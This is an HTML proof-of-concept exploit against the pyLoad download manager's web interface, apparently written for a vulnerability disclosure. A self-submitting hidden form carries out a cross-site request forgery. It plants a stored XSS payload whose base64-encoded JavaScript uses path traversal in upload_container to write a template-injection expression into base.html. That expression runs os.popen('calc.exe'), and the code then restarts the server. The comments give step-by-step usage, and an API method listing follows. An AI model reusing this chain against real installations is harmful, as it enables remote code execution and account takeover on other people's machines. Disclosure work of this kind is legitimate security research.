<!DOCTYPE html>
<html>
<head>
  <title>poc</title>
</head>
<body>
  <form id="poc" action="http://localhost:8000/flash/add" method="POST">
    <input type="hidden" name="package" id="package" value="CSRF TO ADMIN">
    <input type="hidden" name="urls" id="urlsInput">
    <input type="hidden" name="passwords" value="secret123">
  </form>

  <script>
	// steps:
	// 1. upload the file to the internet
	// 2. run pyload locally
	// 3. access the website with this HTML poc
	// 4. Go to pyload -> packages / collector -> open the new package
	// 5. User name 'hacked' with password 'hacked' was created
	// 6. Replicate this PoC to login, and you've got a valid permanent session token
	document.getElementById('poc').addEventListener('submit', function(e) {
		e.preventDefault();
	});
  

	// base64 is: 
	// fetch(`http://localhost:8000/api/upload_container?filename=%27/../../pyload/webui/app/themes/modern/templates/base.html%27&data=b%27{{config.__class__.__init__.__globals__["os"].popen("calc.exe").read()}}%27`);fetch(`http://localhost:8000/api/restart`);
    var base64 = "ZmV0Y2goYGh0dHA6Ly9sb2NhbGhvc3Q6ODAwMC9hcGkvdXBsb2FkX2NvbnRhaW5lcj9maWxlbmFtZT0lMjcvLi4vLi4vcHlsb2FkL3dlYnVpL2FwcC90aGVtZXMvbW9kZXJuL3RlbXBsYXRlcy9iYXNlLmh0bWwlMjcmZGF0YT1iJTI3e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWyJvcyJdLnBvcGVuKCJjYWxjLmV4ZSIpLnJlYWQoKX19JTI3YCk7";
	var payload = '`' + base64 +'`';
	
    var x = `https://google.com"'>CLICKME</a>?<img/src='x'onerror=eval(atob(` + payload + `))//>\n`;
    document.getElementById('package').value = "CSRF TO SSTI";
	document.getElementById('urlsInput').value = x;
    document.getElementById('poc').submit();
	
	// base64 is:
	// setTimeout(() => {console.log("3 seconds have passed");}, 3000);fetch(`http://localhost:8000/api/restart`);setTimeout(() => {console.log("3 seconds have passed");}, 3000);
	base64 = "c2V0VGltZW91dCgoKSA9PiB7Y29uc29sZS5sb2coIjMgc2Vjb25kcyBoYXZlIHBhc3NlZCIpO30sIDMwMDApO2ZldGNoKGBodHRwOi8vbG9jYWxob3N0OjgwMDAvYXBpL3Jlc3RhcnRgKTtzZXRUaW1lb3V0KCgpID0+IHtjb25zb2xlLmxvZygiMyBzZWNvbmRzIGhhdmUgcGFzc2VkIik7fSwgMzAwMCk7";
	payload = '`' + base64 +'`';
	
    x = x + `https://google.com"'>CLICKME</a>?<img/src='x'onerror=eval(atob(` + payload + `))//>\n`;
	//document.getElementById('package').value = "CSRF TO RESTART";
    //document.getElementById('urlsInput').value = x;
    //document.getElementById('poc').submit();
	
	// base64 is:
	// fetch(`http://localhost:8000/`);
	base64 = "ZmV0Y2goYGh0dHA6Ly9sb2NhbGhvc3Q6ODAwMC9gKTs=";
	payload = '`' + base64 +'`';
	x = x + `https://google.com"'>CLICKME</a>?<img/src='x'onerror=eval(atob(` + payload + `))//>`;
	document.getElementById('package').value = "CSRF TO CALC RCE";
    document.getElementById('urlsInput').value = x;
    document.getElementById('poc').submit();
	
  </script>
</body>
</html>

<!---
['_', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_convert_config_format', '_convert_py_file', 'addFiles', 'addPackage', 'add_files', 'add_package', 'add_user', 'call', 'changePassword', 'change_password', 'checkAndAddPackages', 'checkAuth', 'checkOnlineStatus', 'checkOnlineStatusContainer', 'checkURLs', 'check_and_add_packages', 'check_auth', 'check_online_status', 'check_online_status_container', 'check_urls', 'deleteFiles', 'deleteFinished', 'deletePackages', 'delete_files', 'delete_finished', 'delete_packages', 'freeSpace', 'free_space', 'generateAndAddPackages', 'generatePackages', 'generate_and_add_packages', 'generate_packages', 'getAccountTypes', 'getAccounts', 'getAllInfo', 'getAllUserData', 'getCaptchaTask', 'getCaptchaTaskStatus', 'getCollector', 'getCollectorData', 'getConfig', 'getConfigDict', 'getConfigValue', 'getEvents', 'getFileData', 'getFileOrder', 'getInfoByPlugin', 'getLog', 'getPackageData', 'getPackageInfo', 'getPackageOrder', 'getPluginConfig', 'getPluginConfigDict', 'getQueue', 'getQueueData', 'getServerVersion', 'getServices', 'getUserData', 'get_account_types', 'get_accounts', 'get_all_info', 'get_all_userdata', 'get_cachedir', 'get_captcha_task', 'get_captcha_task_status', 'get_collector', 'get_collector_data', 'get_config', 'get_config_dict', 'get_config_value', 'get_events', 'get_file_data', 'get_file_order', 'get_info_by_plugin', 'get_log', 'get_package_data', 'get_package_info', 'get_package_order', 'get_plugin_config', 'get_plugin_config_dict', 'get_queue', 'get_queue_data', 'get_server_version', 'get_services', 'get_userdata', 'get_userdir', 'hasService', 'has_service', 'isAuthorized', 'isCaptchaWaiting', 'isTimeDownload', 'isTimeReconnect', 'is_authorized', 'is_captcha_waiting', 'is_time_download', 'is_time_reconnect', 'kill', 'login', 'moveFiles', 'movePackage', 'move_files', 'move_package', 'orderFile', 'orderPackage', 'order_file', 'order_package', 'parseURLs', 'parse_urls', 'pauseServer', 'pause_server', 'pollResults', 'poll_results', 'pullFromQueue', 'pull_from_queue', 'pushToQueue', 'push_to_queue', 'pyload', 'recheckPackage', 'recheck_package', 'removeAccount', 'remove_account', 'remove_user', 'restart', 'restartFailed', 'restartFile', 'restartPackage', 'restart_failed', 'restart_file', 'restart_package', 'service_call', 'setCaptchaResult', 'setConfigValue', 'setPackageData', 'setPackageName', 'setUserPermission', 'set_captcha_result', 'set_config_value', 'set_package_data', 'set_package_name', 'set_user_permission', 'statusDownloads', 'statusServer', 'status_downloads', 'status_server', 'stopAllDownloads', 'stopDownloads', 'stop_all_downloads', 'stop_downloads', 'togglePause', 'toggleReconnect', 'toggle_pause', 'toggle_proxy', 'toggle_reconnect', 'unpauseServer', 'unpause_server', 'updateAccount', 'update_account', 'uploadContainer', 'upload_container', 'user_exists']
-->

